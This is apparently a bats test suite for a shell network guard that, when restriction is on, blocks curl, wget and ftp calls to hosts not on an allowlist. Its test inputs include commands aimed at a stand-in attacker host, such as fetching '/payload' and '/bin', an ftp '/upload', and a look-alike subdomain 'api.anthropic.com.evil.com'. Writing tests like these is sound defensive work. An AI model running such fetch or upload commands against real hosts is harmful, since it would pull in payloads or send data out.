#!/usr/bin/env bats
# =============================================================================
# Cycle-108 sprint-2 T2.L — Network-restriction env enforcement
# =============================================================================
# SDD §20.10 ATK-A16. Validates that LOA_NETWORK_RESTRICTED=1 + source of
# cheval-network-guard.sh causes curl/wget/nc/ftp to refuse non-allowlisted
# targets (exit 78), while allowlisted endpoints pass through transparently.
#
# These tests do NOT make real network calls — they verify the guard's
# rejection / passthrough decisions BEFORE the delegated binary runs.
# (Passthroughs are verified by intercepting `command curl` via PATH.)
# =============================================================================

setup() {
    REPO_ROOT="$(cd "$BATS_TEST_DIRNAME/../.." && pwd)"
    GUARD="$REPO_ROOT/.claude/scripts/lib/cheval-network-guard.sh"
    BATS_TMPDIR_LOCAL="$(mktemp -d)"
    # Shim `command curl` so tests don't actually hit the network — write a
    # stub that exits 0 with a marker. PATH-based shim doesn't work for
    # `command curl` (it bypasses functions but still uses PATH); we instead
    # override BASH builtin behavior by sourcing the guard inside a subshell
    # with a controlled PATH.
    cat > "$BATS_TMPDIR_LOCAL/curl" <<'STUB'
#!/usr/bin/env bash
echo "STUB_CURL_INVOKED with args: $*"
exit 0
STUB
    chmod +x "$BATS_TMPDIR_LOCAL/curl"
    cat > "$BATS_TMPDIR_LOCAL/wget" <<'STUB'
#!/usr/bin/env bash
echo "STUB_WGET_INVOKED with args: $*"
exit 0
STUB
    chmod +x "$BATS_TMPDIR_LOCAL/wget"
    PATH="$BATS_TMPDIR_LOCAL:$PATH"
    export PATH
}

teardown() {
    rm -rf "$BATS_TMPDIR_LOCAL"
}

@test "T2.L: guard absent when LOA_NETWORK_RESTRICTED unset" {
    unset LOA_NETWORK_RESTRICTED
    # shellcheck source=/dev/null
    source "$GUARD"
    run curl http://evil.example/payload
    [ "$status" -eq 0 ]
    echo "$output" | grep -q "STUB_CURL_INVOKED"
}

@test "T2.L: guard absent when LOA_NETWORK_RESTRICTED=0" {
    export LOA_NETWORK_RESTRICTED=0
    # shellcheck source=/dev/null
    source "$GUARD"
    run curl http://evil.example/payload
    [ "$status" -eq 0 ]
}

@test "T2.L: curl http://evil.example blocked under restriction" {
    export LOA_NETWORK_RESTRICTED=1
    # shellcheck source=/dev/null
    source "$GUARD"
    run curl http://evil.example/path
    [ "$status" -eq 78 ]
    echo "$output" | grep -q "NETWORK-GUARD-BLOCKED"
    # Stub was NOT invoked
    if echo "$output" | grep -q "STUB_CURL_INVOKED"; then
        echo "FAIL: stub curl was invoked despite block"
        return 1
    fi
}

@test "T2.L: curl https://api.anthropic.com/... passes through" {
    export LOA_NETWORK_RESTRICTED=1
    # shellcheck source=/dev/null
    source "$GUARD"
    run curl https://api.anthropic.com/v1/messages
    [ "$status" -eq 0 ]
    echo "$output" | grep -q "STUB_CURL_INVOKED"
}

@test "T2.L: curl https://api.openai.com/... passes through" {
    export LOA_NETWORK_RESTRICTED=1
    # shellcheck source=/dev/null
    source "$GUARD"
    run curl https://api.openai.com/v1/responses
    [ "$status" -eq 0 ]
}

@test "T2.L: curl https://generativelanguage.googleapis.com/... passes" {
    export LOA_NETWORK_RESTRICTED=1
    # shellcheck source=/dev/null
    source "$GUARD"
    run curl https://generativelanguage.googleapis.com/v1beta/models
    [ "$status" -eq 0 ]
}

@test "T2.L: wget http://evil.example blocked" {
    export LOA_NETWORK_RESTRICTED=1
    # shellcheck source=/dev/null
    source "$GUARD"
    run wget http://evil.example/bin
    [ "$status" -eq 78 ]
    echo "$output" | grep -q "NETWORK-GUARD-BLOCKED"
}

@test "T2.L: LOA_NETWORK_ALLOWLIST_EXTRA appends allowed hosts" {
    export LOA_NETWORK_RESTRICTED=1
    export LOA_NETWORK_ALLOWLIST_EXTRA="custom.example.com,my-proxy.io"
    # shellcheck source=/dev/null
    source "$GUARD"
    run curl https://custom.example.com/data
    [ "$status" -eq 0 ]
}

@test "T2.L: subdomain attack 'api.anthropic.com.evil.com' blocked" {
    export LOA_NETWORK_RESTRICTED=1
    # shellcheck source=/dev/null
    source "$GUARD"
    # Exact-match defense: api.anthropic.com.evil.com is NOT api.anthropic.com
    run curl https://api.anthropic.com.evil.com/payload
    [ "$status" -eq 78 ]
}

@test "T2.L: ftp blocked under restriction" {
    export LOA_NETWORK_RESTRICTED=1
    # shellcheck source=/dev/null
    source "$GUARD"
    run ftp ftp://evil.example/upload
    [ "$status" -eq 78 ]
}
